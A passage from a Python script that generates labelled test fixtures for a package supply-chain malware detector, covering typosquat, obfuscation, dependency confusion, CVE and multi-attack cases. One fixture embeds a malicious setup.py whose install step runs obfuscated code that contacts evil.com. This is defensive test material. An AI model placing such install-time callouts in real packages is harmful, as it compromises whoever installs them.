            "setup.py": 'from setuptools import setup\nimport urllib.request\nexec(compile("urllib.request.urlopen(\'http://evil.com/\')", "<x>", "exec"))\nsetup(name="obfs-net", version="1.0.0")\n'
        },
        "expected_rules": ["L2-PYPI-OBFS-001", "L2-NETEX-001"],
    },
]


def generate_multi_attack_fixtures():
    """Generate multi-attack fixtures."""
    count = 0

    for pattern in MULTI_ATTACK_PATTERNS:
        for i in range(10):
            dirname = f"{pattern['name']}_{i}_{random.randint(1000, 9999)}"
            if os.path.exists(os.path.join(POSITIVE_DIR, dirname)):
                continue

            files = pattern["files"]() if callable(pattern["files"]) else pattern["files"]

            fixture = {
                "label": "multi_attack",
                "description": f"Multi-attack: {pattern['name']} variant {i}",
                "expected_rule_ids": pattern["expected_rules"],
            }

            write_fixture(os.path.join(POSITIVE_DIR, dirname), files, fixture)
            count += 1

    return count


# ─── MAIN ───────────────────────────────────────────────────────────────


def main():
    total = 0

    print("Generating expanded typosquat fixtures...")
    total += generate_expanded_typosquat_fixtures()
    print(f"  + {total} typosquat fixtures")

    print("Generating expanded obfuscation fixtures...")
    obfs_count = generate_expanded_obfuscation_fixtures()
    total += obfs_count
    print(f"  + {obfs_count} obfuscation fixtures")

    print("Generating expanded dependency confusion fixtures...")
    depc_count = generate_expanded_dep_confusion_fixtures()
    total += depc_count
    print(f"  + {depc_count} dependency confusion fixtures")

    print("Generating expanded negative fixtures...")
    neg_count = generate_expanded_negative_fixtures()
    total += neg_count
    print(f"  + {neg_count} negative fixtures")

    print("Generating expanded CVE fixtures...")
    cve_count = generate_expanded_cve_fixtures()
    total += cve_count
    print(f"  + {cve_count} CVE fixtures")

    print("Generating multi-attack fixtures...")
    multi_count = generate_multi_attack_fixtures()
    total += multi_count
    print(f"  + {multi_count} multi-attack fixtures")

    # Count final totals
    pos = len([d for d in os.listdir(POSITIVE_DIR) if os.path.isdir(os.path.join(POSITIVE_DIR, d))])
    neg = len([d for d in os.listdir(NEGATIVE_DIR) if os.path.isdir(os.path.join(NEGATIVE_DIR, d))])
    tricky = len([d for d in os.listdir(TRICKY_DIR) if os.path.isdir(os.path.join(TRICKY_DIR, d))])

    print(f"\n✅ Generated {total} new fixtures")
    print(f"Positive: {pos}, Negative: {neg}, Tricky: {tricky}")
    print(f"Total: {pos + neg + tricky}")

    if pos + neg + tricky >= 6000:
        print("🎉 Target reached: 6000+ fixtures!")
    else:
        print(f"⚠️  Target not reached: need {6000 - (pos + neg + tricky)} more fixtures")


if __name__ == "__main__":
    main()
